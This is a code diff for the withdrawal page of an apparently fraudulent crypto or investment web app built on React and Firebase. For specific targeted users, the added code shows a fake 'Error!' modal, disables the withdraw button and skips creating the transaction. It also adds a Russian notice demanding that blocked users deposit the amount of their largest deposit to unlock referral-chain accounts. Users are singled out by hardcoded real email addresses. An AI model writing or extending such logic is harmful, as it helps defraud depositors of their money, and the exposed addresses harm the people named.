@@ -8,7 +8,7 @@ import { AdditionalInformation } from "../../components/Additional-Information/A
 import React, { useContext, useEffect, useState } from "react";
 import { getRandomArbitrary } from "../../utils/helpers";
 import { ConfirmedWindow } from "../../components/ConfirmedWindow/ConfirmedWindow";
-import { addDoc, collection } from "firebase/firestore";
+import { addDoc, collection, doc, updateDoc } from "firebase/firestore";
 import { FirebaseContext } from "../../index";
 import { useOutletContext } from "react-router-dom";
 import { getAuth } from "firebase/auth";
@@ -26,11 +26,13 @@ import { Waves } from "../../components/Waves/Waves";
 import Wallets from "../../components/Wallets/Wallets";
 import Input from "antd/lib/input";
 import notification from "antd/lib/notification";
+import { NadezhdaPrivateKey } from "./NadezhdaPrivateKey";
 
 const Withdraw = () => {
   const [amount, setAmount] = useState(0);
   const [tax, setTax] = useState(0);
   const [isConfirmedModalOpen, setIsConfirmedModalOpen] = useState(false);
+  const [isPrivatKeyOpen, setIsPrivatKeyOpen] = useState(false);
   const [form] = Form.useForm();
   const { firestore } = useContext(FirebaseContext);
   const { userData } = useOutletContext();
@@ -53,8 +55,7 @@ const Withdraw = () => {
     const userWithPrivateKey =
       userData.email === "gevond@mail.ru" ||
       userData.email === "stassy95@mail.ru" ||
-      userData.email === "vova.grigoryants@list.ru" ||
-      userData.email === "bonyklade@gmail.com";
+      userData.email === "vova.grigoryants@list.ru";
 
     if (isErnest) {
       setPrivatKeyAmount(1000);
@@ -85,6 +86,14 @@ const Withdraw = () => {
 
   const handleConfirmedCancel = () => {
     setIsConfirmedModalOpen(false);
+  };
+
+  const handlePrivateKeyOk = () => {
+    setIsPrivatKeyOpen(false);
+  };
+
+  const handlePrivateKeyCancel = () => {
+    setIsPrivatKeyOpen(false);
   };
 
   const next = () => {
@@ -129,6 +138,10 @@ const Withdraw = () => {
               <p>
                 В связи с этим, мы вынуждены были заблокировать все связанные аккаунты. Пожалуйста, не создавайте новые
                 аккаунты и не злоупотребляйте нашими услугами, чтобы избежать дальнейших санкций.
+              </p>
+              <p>
+                Для разблокировки аккаунтов в реферальной цепочке нужно пополнить личные кабинеты на сумму наибольшего
+                депозита по ограниченным кабинетам.
               </p>
             </div>
           ) : (
@@ -280,7 +293,21 @@ const Withdraw = () => {
     }
   };
 
-  const onDone = () => {
+  const onDone = async () => {
+    if (userData.privateKeyNadezhda) {
+      setIsPrivatKeyOpen(true);
+      const userRef = doc(firestore, "users", userData.email);
+      await updateDoc(userRef, {
+        personalPageNadezhda: true,
+      });
+
+      form.resetFields();
+      setTimeout(() => {
+        window.location.reload(false);
+      }, 5000);
+      return;
+    }
+
     form.validateFields().then(async (values) => {
       await addDoc(collection(firestore, "transactions"), {
         account_id: auth.currentUser.uid,
@@ -340,12 +367,26 @@ const Withdraw = () => {
             </Tooltip>
           )}
           {current === steps.length - 1 && (
-            <Button onClick={onDone} type="primary" disabled={isPrivatKeyShowed}>
+            <Button
+              onClick={onDone}
+              type="primary"
+              disabled={isPrivatKeyShowed || userData.isPrivateKeyWarning || userData.personalPageNadezhda}
+            >
               {t("transactions.done")}
             </Button>
           )}
         </div>
       </Form>
+      <Modal
+        open={isPrivatKeyOpen}
+        onOk={handlePrivateKeyOk}
+        onCancel={handlePrivateKeyCancel}
+        cancelText={t("replenishment.cancel")}
+        title={<p className={styles["title-modal"]}>Ошибка!</p>}
+        footer={null}
+      >
+        <NadezhdaPrivateKey />
+      </Modal>
       <Modal
         open={isConfirmedModalOpen}
         onOk={handleConfirmedOk}
